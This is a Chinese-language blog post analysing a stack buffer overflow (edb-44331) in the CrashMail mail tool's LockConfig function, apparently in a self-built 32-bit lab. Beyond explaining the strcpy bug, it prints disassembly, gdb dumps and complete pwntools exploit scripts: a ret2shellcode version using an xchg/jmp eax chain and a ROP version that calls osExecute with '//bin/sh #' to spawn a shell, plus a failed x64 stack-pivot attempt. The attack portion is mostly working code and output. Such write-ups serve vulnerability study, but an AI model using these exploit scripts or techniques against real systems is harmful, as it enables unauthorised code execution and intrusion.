---
layout: post
title:  "Crashmail 栈溢出漏洞分析"
date:   2025-04-17 13:27:38 +0800
category: userspace
---
CrashMail 是一款早期的开源 DOS 系统下的 BBS 邮件处理工具。
漏洞编号：edb-44331
利用环境：ubuntu 20.04，源代码32位编译

# 漏洞信息

CrashMail 是一款早期的开源 DOS 系统下的 BBS 邮件处理工具。

漏洞编号：edb-44331

利用环境：ubuntu 20.04，源代码32位编译

内存控制能力：

- 有NULL截断
- 攻击者对输入内容不完全可控，payload末尾会添加“.busy”字符串

# 漏洞分析

以下是对x86程序的分析

漏洞函数位是LockConfig，由main函数直接调用：

![crashmail.jpg](/assets/posts/2025-04-17-Crashmail 栈溢出漏洞分析/crashmail.jpg)

漏洞位置很明显，file字符串使用strcpy函数直接拷贝到buf[200]数组中，并且在末尾添加了“.busy”的字符串。

所以溢出的对象是LockConfig函数的buf数组，覆盖的返回值是LockConfig函数到main函数的返回地址，存在NULL字符截断，攻击者的输入内容不完全可控。

```c
bool LockConfig(char *file)
{
	char buf[200];
	osFile fp;
	
	strcpy(buf,file);
	strcat(buf,".busy");

	......
	
	osClose(fp);

	return(TRUE);
}
```

若攻击者输入如下命令行参数，那么一长串字符‘c’就会被当做参数传递给LockConfig函数

```bash
$ ./crashmail "SETTINGS" ccccccccccccccccccccccccccccccccccccccccccccccccccc
```

main函数对参数的解析如下：

```c
int main(int argc, char **argv)
{
   char *cfg;
   uint32_t cfgline;
   short seconderr;
   char errorbuf[500];

   signal(SIGINT,breakfunc);

   if(!osInit())
      CleanUp(OS_EXIT_ERROR);

   done_osinit=TRUE;

   if(argc > 1 &&
	  (strcmp(argv[1],"?")==0      ||
		strcmp(argv[1],"-h")==0     ||
		strcmp(argv[1],"--help")==0 ||
		strcmp(argv[1],"help")==0 ||
		strcmp(argv[1],"/h")==0     ||
		strcmp(argv[1],"/?")==0 ))
   {
      printargs(args);
      CleanUp(OS_EXIT_OK);
   }

   if(!parseargs(args,argc,argv))// 分析命令行参数，若有“SETTINGS”，那么随后的字符串
															   // 就是文件名，被保存到args[ARG_SETTINGS].data
      CleanUp(OS_EXIT_ERROR);

   if(args[ARG_VERSION].data)
   {
      Version();
      CleanUp(OS_EXIT_OK);
   }

	cfg=getenv(OS_CONFIG_VAR);

   if(!cfg)
		cfg=OS_CONFIG_NAME;

   if(args[ARG_SETTINGS].data)
      cfg=(char *)args[ARG_SETTINGS].data;    // cfg 可以由“SETTINGS”命令行参数指定

   if(args[ARG_LOCK].data)
   {
		if(!LockConfig(cfg))        // 如果命令行参数中有“LOCK”，那么先走这里的LockConfig
		{
			printf("Failed to lock configuration file %s\n",cfg);
			CleanUp(OS_EXIT_ERROR);
		}
		
		printf("CrashMail is now locked, use UNLOCK to unlock\n"); 
		CleanUp(OS_EXIT_OK);
	}

 ......

	if(!(done_lockconfig=LockConfig(cfg))) // 这里也有LockConfig，cfg参数攻击者指定
	{
		printf("Failed to lock configuration file %s\n",cfg);
		CleanUp(OS_EXIT_ERROR);
	}

```

从反汇编可以观察到buf数组到保存的rbp距离为0xd4，那么到返回地址的距离就是0xd8

```bash
text:0804A913 ; bool __cdecl LockConfig(char *file)
.text:0804A913                 public LockConfig
.text:0804A913 LockConfig      proc near               ; CODE XREF: main+1CE↓p
.text:0804A913                                         ; main+264↓p
.text:0804A913
.text:0804A913 buf             = byte ptr -0D4h
.text:0804A913 fp              = dword ptr -0Ch
.text:0804A913 file            = dword ptr  8
.text:0804A913
.text:0804A913 ; __unwind {
.text:0804A913                 endbr32
.text:0804A917                 push    ebp
.text:0804A918                 mov     ebp, esp
.text:0804A91A                 push    edi
.text:0804A91B                 push    ebx
.text:0804A91C                 sub     esp, 0D0h
.text:0804A922                 call    __x86_get_pc_thunk_bx
.text:0804A927                 add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)
.text:0804A92D                 sub     esp, 8
.text:0804A930                 push    [ebp+file]      ; src
.text:0804A933                 lea     eax, [ebp+buf]
.text:0804A939                 push    eax             ; dest
```

攻击者构造如下启动命令就能造成返回地址覆盖为0xdeadbeef

```bash
payload = b'\x90' * 0xd8 + p32(0xdeadbeef)
```

# 关键状态调试

## x86下的调试

断点位置选0x804AA19，也就是LockConfig函数ret之前                 

```bash
.text:0804AA13
.text:0804AA13 loc_804AA13:                            ; CODE XREF: LockConfig+95↑j
.text:0804AA13                                         ; LockConfig+EB↑j
.text:0804AA13                 lea     esp, [ebp-8]
.text:0804AA16                 pop     ebx
.text:0804AA17                 pop     edi
.text:0804AA18                 pop     ebp
.text:0804AA19                 retn
.text:0804AA19 ; } // starts at 804A913
.text:0804AA19 LockConfig      endp
.text:0804AA19
```

可以观察到buf数组地址为0xffad1a24，此时和栈地址相关的寄存器除了esp还有esi，esi寄存器的值为0xffad1d50，相对buf数组在高位，esi指向的位置距离返回地址                                             

```bash
Breakpoint 1, 0x0804aa19 in LockConfig (                                              │sh: 1: .busy: not found
    file=0x80649cf <Filter_Execute+525> "P\350", <incomplete sequence \353>)          │test@0c3259477029:/test$ ls
    at crashmail/crashmail.c:505                                                      │bin                 crashmail-1.6         enter_container.sh  exp2.py
505     }                                                                             │container_start.sh  crashmail-1.6.tar.gz  exp1.py
0xffad1d50:     0x69622f2f      0x68732f6e      0x75622e23      0xff007973            │test@0c3259477029:/test$ ./exp2.py 
0xffad1d60:     0xf7f95000      0x00000000      0xffad1dc8      0x00000000            │Failed to create lock file 
0xffad1d70:     0xf7fdb000      0x00000000      0xf7f95000      0xf7f95000            │sh: 1: .busy: not found
0xffad1d80:     0x00000000      0x9667f81c      0x74c07e0c      0x00000000            │test@0c3259477029:/test$ ./exp2.py 
(gdb) info reg                                                                        │Failed to create lock file 
eax            0x0                 0                                                  │sh: 1: .busy: not found
ecx            0x0                 0                                                  │test@0c3259477029:/test$ ./exp2.py 
edx            0x807437a           134693754                                          │Failed to create lock file 
ebx            0x90909090          -1869574000                                        │sh: 1: .busy: not found
esp            0xffad1afc          0xffad1afc                                         │test@0c3259477029:/test$ ls | .busy
ebp            0x90909090          0x90909090                                         │-bash: .busy: command not found
esi            0xffad1d50          -5431984                                           │test@0c3259477029:/test$ ls       
edi            0x90909090          -1869574000                                        │bin                 crashmail-1.6         enter_container.sh  exp2.py
eip            0x804aa19           0x804aa19 <LockConfig+262>                         │container_start.sh  crashmail-1.6.tar.gz  exp1.py
eflags         0x282               [ SF IF ]                                          │test@0c3259477029:/test$ ls#.busy  
cs             0x23                35                                                 │-bash: ls#.busy: command not found
ss             0x2b                43                                                 │test@0c3259477029:/test$ ls #.busy
ds             0x2b                43                                                 │bin                 crashmail-1.6         enter_container.sh  exp2.py
es             0x2b                43                                                 │container_start.sh  crashmail-1.6.tar.gz  exp1.py
fs             0x0                 0                                                  │test@0c3259477029:/test$ ./exp2.py 
gs             0x63                99   
(gdb) p &buf                                                                          │l', '-x', '/tmp/pwnlib-gdbscript-rsi1he64.gdb']
$1 = (char (*)[200]) 0xffad1a24                                                       │[*] Paused (press any to continue)
(gdb)                                 
```

esi寄存器位于栈的高地址，这个有利的情况有助于我们解决2个矛盾：

- ret2shellcode利用方式中，在当前程序里面找不到“jmp esp”指令

我们可以把shellcode放到esi指向的位置后面，使用“xchg”指令把esi寄存器交换到eax寄存器中，再“jmp eax”跳转到shellcode执行。此种方式栈布局如下：

![crashmail-ret2shellcode.jpg](/assets/posts/2025-04-17-Crashmail 栈溢出漏洞分析/crashmail-ret2shellcode.jpg)

- rop利用方式中，找不到已知地址用来放字符串”/bin/sh”：

在可执行程序中可以找到命令执行函数osExecute：

```bash
int osExecute(char *cmd){
   int res;
   res=system(cmd);
   return WEXITSTATUS(res);
}
```

在地址 0x80649CF 处对cmd参数地址进行了压栈：

```bash
.text:080649CF                 push    eax             ; cmd
.text:080649D0                 call    osExecute
.text:080649D5                 add     esp, 10h
.text:080649D8                 mov     [ebp+arcres], eax
```

因此我们可以在esi指向的栈中布置字符串“//bin/sh #”，其中“#”是为了注释掉“.busy”字符串，排除掉不可控字符串对命令执行的干扰，形成如下调用：

```c
system("//bin/sh #.busy");
```

我们可以用xchg指令把esi的值交换到eax中，再跳到 0x80649CF gadget处执行，那么/bin/sh字符串地址就可以被压栈。此种情况下栈布局为：

![crashmail-rop.jpg](/assets/posts/2025-04-17-Crashmail 栈溢出漏洞分析/crashmail-rop.jpg)

## x64下的调试

x64下buf到栈上面保存的rbp的距离为0xd0，到返回地址的距离为0xd8

```bash
.text 00000000004038E6 ; bool __cdecl LockConfig(char *file)
.text:00000000004038E6                 public LockConfig
.text:00000000004038E6 LockConfig      proc near               ; CODE XREF: main+1CB↓p
.text:00000000004038E6                                         ; main+24B↓p
.text:00000000004038E6
.text:00000000004038E6 file            = qword ptr -0D8h
.text:00000000004038E6 buf             = byte ptr -0D0h
.text:00000000004038E6 fp              = qword ptr -8
.text:00000000004038E6
.text:00000000004038E6 ; __unwind {
.text:00000000004038E6                 endbr64
.text:00000000004038EA                 push    rbp
.text:00000000004038EB                 mov     rbp, rsp
.text:00000000004038EE                 sub     rsp, 0E0h
.text:00000000004038F5                 mov     [rbp+file], rdi
.text:00000000004038FC                 mov     rdx, [rbp+file]
.text:0000000000403903                 lea     rax, [rbp+buf]
.text:000000000040390A                 mov     rsi, rdx        ; src
.text:000000000040390D                 mov     rdi, rax        ; dest
.text:0000000000403910                 call    _strcpy
.text:0000000000403915                 lea     rax, [rbp+buf]
```

把断点下在0x4039EE，LockConfig函数ret之前：

```bash
.text:00000000004039DC loc_4039DC:                             ; CODE XREF: LockConfig+D2↑j
.text:00000000004039DC                 mov     rax, [rbp+fp]
.text:00000000004039E0                 mov     rdi, rax        ; os
.text:00000000004039E3                 call    osClose
.text:00000000004039E8                 mov     eax, 1
.text:00000000004039ED
.text:00000000004039ED locret_4039ED:                          ; CODE XREF: LockConfig+A0↑j
.text:00000000004039ED                                         ; LockConfig+F4↑j
.text:00000000004039ED                 leave
.text:00000000004039EE                 retn
.text:00000000004039EE ; } // starts at 4038E6
.text:00000000004039EE LockConfig      endp
```

buf数组位于0x7ffe8bd42aa0 ，寄存器里除了rsp之外还有r13指向栈地址，但是r13指向的位置比rsp指针指向的位置高。由于存在NULL截断，所以就写不到这个位置。

```bash
Breakpoint 1, 0x00000000004039ee in LockConfig (file=0x7ffe8bd44797 '\220' <repeats 200 times>...)     │test@0c3259477029:/test$ 
    at crashmail/crashmail.c:505                                                                       │test@0c3259477029:/test$ 
505     }                                                                                              │test@0c3259477029:/test$ ls                                                  │p_x64.py
(gdb) info reg                                                                                         │test@0c3259477029:/test$ ./exp_x64.py 
rax            0x1                 1                                                                   │[+] Starting local process '/usr/bin/gdbserver': pid 1212
rbx            0x42f950            4389200                                                             │[*] running in new terminal: ['/usr/bin/gdb', '-q', '/test/crashmail-1.6/bin/crashmail', '-x', '/tmp/p
rcx            0x1                 1                                                                   │wnlib-gdbscript-m6dywxad.gdb']
rdx            0x0                 0                                                                   │[*] Paused (press any to continue)
rsi            0x17e372a0          400781984                                                           │
rdi            0x17e37048          400781384                                                           │
rbp            0x9090909090909090  0x9090909090909090                                                  │
rsp            0x7ffe8bd42b78      0x7ffe8bd42b78                                                      │
r8             0x0                 0                                                                   │
r9             0x1                 1                                                                   │
r10            0x400b93            4197267                                                             │
r11            0x202               514                                                                 │
r12            0x402910            4204816                                                             │
r13            0x7ffe8bd42e90      140731244359312                                                     │
r14            0x0                 0                                                                   │
r15            0x0                 0                                                                   │
rip            0x4039ee            0x4039ee <LockConfig+264>                                           │
eflags         0x206               [ PF IF ]                                                           │
cs             0x33                51                                                                  │
ss             0x2b                43                                                                  │
ds             0x0                 0                                                                   │
es             0x0                 0                                                                   │
fs             0x0                 0                                                                   │
gs             0x0                 0                                                                   │
(gdb) p &buf                                                                                           │
$1 = (char (*)[200]) 0x7ffe8bd42aa0                                       
```

### 栈劫持尝试

这种情况下我们尝试把栈劫持到buf[200]数组的范围内。

根据事实，x64程序的返回通常使用”leave ret“，以osExecute为例：

```bash
.text:000000000042F656 osExists        proc near               ; CODE XREF: LockConfig+AC↑p
.text:000000000042F656                 endbr64
.text:000000000042F65A                 push    rbp
.text:000000000042F65B                 mov     rbp, rsp
.text:000000000042F65E                 sub     rsp, 0A0h
.text:000000000042F665                 mov     [rbp+file], rdi
.text:000000000042F66C                 lea     rdx, [rbp+st]
.text:000000000042F673                 mov     rax, [rbp+file]
.text:000000000042F67A                 mov     rsi, rdx        ; stat_buf
.text:000000000042F67D                 mov     rdi, rax        ; filename
.text:000000000042F680                 call    stat_0
.text:000000000042F685                 test    eax, eax
.text:000000000042F687                 jnz     short loc_42F690
.text:000000000042F689                 mov     eax, 1
.text:000000000042F68E                 jmp     short locret_42F695
.text:000000000042F690 loc_42F690:                             ; CODE XREF: osExists+31↑j
.text:000000000042F690                 mov     eax, 0
.text:000000000042F695
.text:000000000042F695 locret_42F695:                          ; CODE XREF: osExists+38↑j
.text:000000000042F695                 leave
.text:000000000042F696                 retn
.text:000000000042F696 osExists        endp
```

其中leave用于平衡栈，相当于指令：

```bash
mov rsp, rbp     ; 恢复rsp
pop rbp          ; 恢复父函数的rbp
```

当前函数返回的时候先用rbp寄存器恢复rsp指向save rbp，再从栈里面恢复父函数的rbp寄存器。

同理，当父函数返回的时候，同样也会调用leave指令，用rbp寄存器来恢复rsp，

而父函数使用的rbp寄存器，则由于子函数的栈溢出而被攻击者控制。

因此只要把栈上面保存的rbp覆盖为我们想要的值，那么当父函数返回的时候就会发生栈劫持。

攻击者可以在fake stack上面布置rop链，或者进行ret2shellcode攻击。

![crashmail-劫持rsp.jpg](/assets/posts/2025-04-17-Crashmail 栈溢出漏洞分析/crashmail-%E5%8A%AB%E6%8C%81rsp.jpg)

![crashmail-劫持rsp.jpg](/assets/posts/2025-04-17-Crashmail 栈溢出漏洞分析/crashmail-%E5%8A%AB%E6%8C%81rsp%201.jpg)

很不幸的是这个思路无法完成，存在以下4个无法解决的问题：

- LockConfig函数的父函数是main，但是LockConfig返回到main函数后，main函数并不会马上结束，而是继续调用了其他函数，这就会导致我们在buf[200]上面布置好的jmp esp指令和shellcode会被破坏掉。因为我们只能控制栈上面的内容，但凡是可以往其他段上面写东西，就不存在这个问题了；
- 通过NULL字节覆盖saved rbp的最低字节为0，还是没办法让rbp落在buf[200]数组中，因为main函数分配的栈空间很大，超过了0xFF，所以覆盖下来rbp还是指向main函数的栈空间；
- 即使我们能够成功让rbp指向buf[200]数组，这也是随机事件，存在概率性，不可能每次都成功；
- 当然最重要的，也无法解决的就是，即使我们把栈劫持到了buf[200]数组，我们还要提前把fake stack布置好吧，
    - 如果是ret2shellcode，那么就要往里面模拟出fake rbp和“jmp esp”指令的地址。fake rbp好搞定，写0xdeadbeefdeadbeef就行了。指令地址就不行了，因为里面有\x00。
    - 如果是rop，那更完蛋，因为rop里面全是地址，完全写不了！

所以综上，栈劫持的思路也搞不定。

最后附上这次调试记录：

```bash
# 第一次断在LockConfig函数的ret指令的位置, 查看buf[200]数组的地址为 0x7ffda2738a00 
# 此时rbp寄存器已经被恢复为main函数的栈帧了
# 到这个断点的时候，exp调试脚本已经把rbp寄存器手工设置为buf地址
# 并且LockConfig的返回地址也修改为直接返回到main函数的leave ret指令处，不再调用其他函数直接退出
# 在main函数的ret指令处下断点，观察栈劫持是否成功

Reading /lib64/ld-linux-x86-64.so.2 from remote target...                                       │[*] Process '/usr/bin/gdbserver' stopped with exit code 0 (pid 1261)
0x00007fd8d2981100 in _start () from target:/lib64/ld-linux-x86-64.so.2                         │test@0c3259477029:/test$ 
Breakpoint 1 at 0x4039ee: file crashmail/crashmail.c, line 505.                                 │test@0c3259477029:/test$ 
Reading /lib/x86_64-linux-gnu/libc.so.6 from remote target...                                   │test@0c3259477029:/test$ 
                                                                                                │test@0c3259477029:/test$ ./exp_x64.py 
Breakpoint 1, 0x00000000004039ee in LockConfig (                                                │[+] Starting local process '/usr/bin/gdbserver': pid 1271
    file=0x7ffda273a7ad '\220' <repeats 200 times>...) at crashmail/crashmail.c:505             │[*] running in new terminal: ['/usr/bin/gdb', '-q', '/test/crashmail-1.6/bin/crashmail', '-x', 
505     }                                                                                       │'/tmp/pwnlib-gdbscript-r447ypjw.gdb']
$1 = (char (*)[200]) 0x7ffda2738a00                                                             │[*] Paused (press any to continue)
Breakpoint 2 at 0x404188: file crashmail/crashmail.c, line 720.                                 │[*] Process '/usr/bin/gdbserver' stopped with exit code 0 (pid 1275)
(gdb) p/x $rbp                                                                                  │test@0c3259477029:/test$ 
$2 = 0x7ffda2738a00    

# 继续运行，在main函数的ret指令处断下
# 观察此时rsp的值为0x7ffda2738a08，已经位于buf数组中
# 证明可以使用leave ret进行栈劫持                                                                
(gdb) c                                                                                         │test@0c3259477029:/test$ 
Continuing.                                                                                     │test@0c3259477029:/test$ 
                                                                                        │test@0c3259477029:/test$ ls
Breakpoint 2, 0x0000000000404188 in main (argc=32728, argv=0x0) at crashmail/crashmail.c:720    │ bin
720     }                                                                                       │ container_start.sh
(gdb) p/x $rsp                                                                                  │ crashmail-1.6
$3 = 0x7ffda2738a08                                                                             │ crashmail-1.6.tar.gz
(gdb)                    

```

 

附上调试exp：

```python
#!/usr/bin/python

# shellcode版本
from subprocess import run
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-hb']

offset = 0xd0
offset -= len('.busy')
offset -= 1

payload = b'\x90' * offset
script = '''
    b *0x4039EE
    c
    p &buf
    set $rbp=$1
    set *(unsigned long*)$rsp=0x404187
    b *0x404188
'''

# run(["/test/crashmail-1.6/bin/crashmail", "SETTINGS", payload])
gdb.debug(args=["/test/crashmail-1.6/bin/crashmail", "LOCK", "SETTINGS", payload, "UNLOCK"], gdbscript=script, exe="/test/crashmail-1.6/bin/crashmail")
pause()
```

# 漏洞利用

## shellcode版本

```python
#!/usr/bin/python

# shellcode版本
from subprocess import run
from pwn import *

context.arch = 'i386'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-hb']

offset = 0xd8       # buf数组到栈上面保存rbp的距离
xchg_eax_esi_ret = 0x80674ab
jmp_eax = 0x8051807

shellcode = asm(shellcraft.sh())

payload = b'\x90' * offset + p32(xchg_eax_esi_ret) + \
            p32(jmp_eax) + b'\x90' * 0x300 + shellcode

run(["/test/crashmail-1.6/bin/crashmail", "SETTINGS", payload])
```

![1.png](/assets/posts/2025-04-17-Crashmail 栈溢出漏洞分析/1.png)

## rop版本

```bash
#!/usr/bin/python

# rop版本
from subprocess import run
from pwn import *

context.arch = 'i386'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-hb']

offset = 0xd8       # buf数组到栈上面保存rbp的距离
xchg_eax_esi_ret = 0x80674ab
osExecute = 0x80649CF     # push    eax; call    osExecute

rw_seg = 0x807d010

payload = b'\x90' * offset + p32(xchg_eax_esi_ret) + p32(osExecute) + \
					b'\x90' * 0x24c + b'//bin/sh #'

run(["/test/crashmail-1.6/bin/crashmail", "SETTINGS", payload])
```

![批注 2025-04-17 154222.png](/assets/posts/2025-04-17-Crashmail 栈溢出漏洞分析/%E6%89%B9%E6%B3%A8_2025-04-17_154222.png)